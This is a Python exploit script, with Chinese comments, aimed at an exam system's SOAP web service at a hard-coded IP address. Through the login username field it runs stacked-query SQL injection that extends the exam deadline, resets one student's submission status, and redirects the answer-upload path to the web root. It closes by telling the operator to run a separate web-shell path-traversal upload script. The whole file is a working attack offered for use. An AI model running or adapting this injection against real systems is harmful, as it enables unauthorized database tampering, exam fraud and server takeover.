import requests
import time

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def send_sql_payload(payload_name, sql_command):
    print(f"[*] 执行操作 [{payload_name}]...")
    print(f"    SQL: {sql_command}")

    # 注入: admin'; {sql_command}; --
    injection = f"admin'; {sql_command}; --"
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap_payload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        headers = HEADERS.copy()
        headers["SOAPAction"] = "http://tempuri.org/Login"
        response = requests.post(TARGET_URL, data=soap_payload.encode('utf-8'), headers=headers, timeout=10)
        print(f"    -> 响应状态: {response.status_code}")
    except Exception as e:
        print(f"    -> 发送异常: {e}")

def modify_exam_config():
    print("=== 开始修改考试配置 (解锁上传功能) ===")

    # 1. 延长考试结束时间到 2099 年
    # 注意: StopTime 是配置项 Name
    sql_time = "UPDATE Exam2020Config SET Value='2099-12-31 23:59:59' WHERE Name='StopTime'"
    send_sql_payload("延长考试时间", sql_time)

    # 2. 重置用户提交状态 (防止 '试卷已提交' 错误)
    # 针对 UID 9207 (我们在上传脚本里用的 ID)
    sql_submit = "UPDATE Exam2020Stu SET Submitted=0 WHERE ID=9207"
    send_sql_payload("重置提交状态(UID=9207)", sql_submit)

    # 3. 修改文件保存路径 (关键！)
    # 将 AnswerPath 修改为 Web 根目录所在的盘符/目录
    # 原来可能是 F:\Exam2020\，我们改成 e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\
    # 这样 GetFilder 就会生成基于 Web 目录的路径
    # 注意：GetFilder 会在后面追加 Answer\...\A01\，所以我们需要在上传文件名里加 ..\ 来回溯

    # 为了保险，我们先不改路径，先尝试利用“时间解锁”+“相对路径遍历”上传。
    # 如果 F 盘无法跨盘符到 E 盘，我们再来执行修改路径的操作。
    # 不过，考虑到之前的 404，还是改一下路径比较稳妥，确保文件落在 Web 目录结构下。

    target_root = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web"
    # 注意 SQL 字符串转义
    target_root_sql = target_root.replace("'", "''")

    sql_path = f"UPDATE Exam2020Config SET Value='{target_root_sql}' WHERE Name='AnswerPath'"
    send_sql_payload("修改上传根路径(AnswerPath)", sql_path)

    print("\n[+] 配置修改完成。请运行 exploit_webshell_traversal.py 进行上传。")

if __name__ == "__main__":
    modify_exam_config()
